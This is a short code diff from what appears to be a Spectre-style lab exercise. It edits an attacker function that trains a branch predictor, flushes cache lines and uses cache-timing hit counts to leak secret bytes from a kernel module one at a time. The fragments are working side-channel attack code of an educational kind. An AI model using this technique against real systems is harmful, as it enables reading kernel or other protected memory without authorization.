@@ -47,17 +47,6 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // [Part 3]- Fill this in!
         // leaked_byte = ??
-        leaked_byte = '?';
-        const uint64_t CACHE_HIT_THRESHOLD = 80;
-        // Step 1: Train branch predictor
-        for (int train = 0; train < 40; train++) {
-            call_kernel_part3(kernel_fd, shared_memory, 0);
-        }
-
-        // Step 2: Flush part3_limit to extend speculation window
-        clflush(&shared_memory[0]);
-
-        // Step 3: Flush shared memory
         const uint64_t CACHE_HIT_THRESHOLD = 80;
         int counts[256] = {0};
         const int max_attempts = 100;
@@ -99,7 +88,6 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         }
 
         char leaked_byte = best_guess;
-        // leaked_byte = ??
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
